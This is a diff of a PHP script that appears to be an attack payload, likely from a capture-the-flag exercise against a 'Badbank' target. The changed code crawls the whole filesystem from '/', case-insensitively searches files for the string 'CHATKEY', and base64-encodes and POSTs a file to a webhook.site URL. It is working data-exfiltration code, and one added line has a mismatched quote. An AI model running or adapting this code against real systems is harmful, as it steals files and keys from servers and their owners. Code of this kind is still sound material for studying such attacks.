@@ -5,8 +5,17 @@ function sendFileBase64($pathToFile)
   $contents = fread($handle, filesize($pathToFile));
   fclose($handle);
   $b64Content=base64_encode($contents);
-  $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0?jpg=" . $b64Content;
-  $content = file_get_contents($url);
+  $data = array('jpg' => $b64Content);
+  $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0';
+  $options = array(
+    'http' => array(
+    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+    'method'  => 'POST',
+    'content' => http_build_query($data)
+    )
+);
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
 }
 
 
@@ -27,7 +36,7 @@ function getDirContents($dir, &$results = array()) {
 
 function searchForKey($path)
 {
-  if( strpos(file_get_contents($path),'CHATKEY') !== false) {
+  if( stripos(file_get_contents($path),'CHATKEY') !== false) {
     $handle = fopen($path, "rb");
     $contents = fread($handle, filesize($path));
     fclose($handle);
@@ -41,18 +50,17 @@ function searchForKey($path)
 
 $output ='';
 // All your base are belong to us >=E
-//$filename = "/home/pinhead/susip0rn.jpg";
-//sendFileBase64($filename);
+$filename = "/home/pinhead/susip0rn.jpg";
+sendFileBase64($filename);
 
-$rootDir='/home/';
+$rootDir='/';
+
+// Get the array of all files, stored in this directory or underlying directories. 
 getDirContents($rootDir,$files);
 
 foreach ($files as $key => $value) {
   searchForKey($value);
 }
-//$output =$output."\n /home/pinhead/backups/betaBadbank/ ls: \n ".shell_exec ('ls /home/pinhead/backups/betaBadbank/  | cat');
-//$output =$output."\n /home/pinhead/backups/oldBadbank/ ls: \n ".shell_exec ('ls /home/pinhead/backups/oldBadbank/  | cat');
-//$output =$output."\n /home/pinhead/backups/dump.sql/ ls: \n ".shell_exec ('ls /home/pinhead/backups/dump.sql/  | cat');
 
-throw new Exception("\n SUCCESS  ". $output."\n");
+throw new Exception("\n SUCCESS \n");
 ?>
